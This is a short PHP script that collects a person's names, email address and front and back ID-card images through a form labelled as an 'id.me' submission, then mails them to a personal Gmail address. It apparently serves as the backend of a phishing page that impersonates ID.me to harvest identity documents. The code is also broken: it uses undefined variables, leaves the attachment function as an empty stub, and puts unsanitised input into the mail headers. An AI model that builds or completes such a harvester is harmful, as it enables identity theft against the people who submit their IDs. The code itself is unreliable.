<?php
// Retrieve form data
$firstname = $_POST['firstname'];
$lastname = $_POST['lastname'];
$middlename = $_POST['middlename'];
$email = $_POST['email'];
$message = $_POST['message'];

// Handle file uploads
$frontIdImage = $_FILES['front_id_image'];
$backIdImage = $_FILES['back_id_image'];

// Set up email parameters
$to = 'kelcywomak@gmail.com'; // Replace with your email address
$subject = 'New id.me Details Submission';
$headers = "From: $firstname $lastname <$email>\r\n";
$headers .= "Reply-To: $email\r\n";
$message = "First Name: $firstname\r\n";
$message .= "Last Name: $lastname\r\n";
$message .= "Middle Name: $middlename\r\n";
$message .= "Phone Number: $phonenumber\r\n";
$message .= "Email: $email\r\n";
$message .= "Date: $date\r\n";
$message .= "Month: $month\r\n";
$message .= "Year: $year\r\n";

// Attach uploaded files to the email
$attachments = array($frontIdImage['tmp_name'], $backIdImage['tmp_name']);
$attachmentNames = array($frontIdImage['name'], $backIdImage['name']);

// Send email with attachments
$mailSent = sendEmailWithAttachments($to, $subject, $message, $attachments, $attachmentNames);

// Send the email
$mailSent = mail($to, $subject, $message, $headers);

// Check if the email was sent successfully
if ($mailSent) {
  echo 'Thank you for your submission. We will get back to you soon.';
} else {
  echo 'Oops! Something went wrong. Please try again.';
}

// Function to send email with attachments using PHPMailer or other library
function sendEmailWithAttachments($to, $subject, $message, $attachments, $attachmentNames) {
    // Code to send email with attachments using PHPMailer or other library
    // Implement the necessary steps to send the email with attachments
    // Example: Using PHPMailer library
    // ...
  }
?>